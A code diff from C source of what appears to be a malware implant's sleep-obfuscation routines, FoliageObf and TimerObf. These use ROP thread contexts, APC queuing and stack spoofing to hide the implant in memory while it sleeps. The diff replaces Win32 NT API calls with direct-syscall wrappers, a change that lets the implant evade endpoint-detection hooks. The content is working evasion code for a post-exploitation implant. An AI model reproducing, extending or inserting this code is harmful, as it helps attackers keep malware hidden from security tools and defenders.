@@ -110,7 +110,7 @@ VOID FoliageObf(
             RopSetCtx2->ContextFlags    = CONTEXT_FULL;
             RopExitThd->ContextFlags    = CONTEXT_FULL;
 
-            if ( NT_SUCCESS( Instance.Win32.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
+            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
             {
                 if ( NT_SUCCESS( Instance.Win32.NtGetContextThread( hThread, RopInit ) ) )
                 {
@@ -233,7 +233,7 @@ VOID FoliageObf(
                         RopSpoof->Rsp = U_PTR( Instance.Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers
 
                         // Execute every registered Apc thread
-                        Instance.Win32.NtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
+                        SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
                     }
                 }
             }
@@ -436,7 +436,7 @@ BOOL TimerObf(
                 if ( NT_SUCCESS( NtStatus ) )
                 {
                     /* wait til we successfully retrieved the timers thread context */
-                    if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
+                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                         PRINTF( "Failed waiting for starting event: %p\n", NtStatus )
                         goto LEAVE;
                     }
@@ -451,7 +451,7 @@ BOOL TimerObf(
                         }
 
                         /* duplicate the current thread we are going to spoof the stack */
-                        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
+                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                             goto LEAVE;
                         }
 
@@ -566,7 +566,7 @@ BOOL TimerObf(
                     }
 
                     /* just wait for the sleep to end */
-                    if ( ! ( Success = NT_SUCCESS( NtStatus = Instance.Win32.NtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
+                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                         PRINTF( "NtSignalAndWaitForSingleObject Failed => %p\n", NtStatus );
                     } else {
                         Success = TRUE;
